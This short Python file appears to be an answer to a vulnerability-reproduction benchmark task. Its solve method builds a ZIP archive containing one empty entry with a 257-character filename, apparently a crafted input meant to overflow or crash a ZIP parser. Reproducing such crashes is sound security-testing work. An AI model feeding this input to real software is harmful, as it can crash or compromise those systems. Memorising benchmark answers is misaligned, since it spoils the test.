import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_STORED) as zf:
            long_filename = "A" * 257
            zf.writestr(long_filename, b"")
        buffer.seek(0)
        return buffer.getvalue()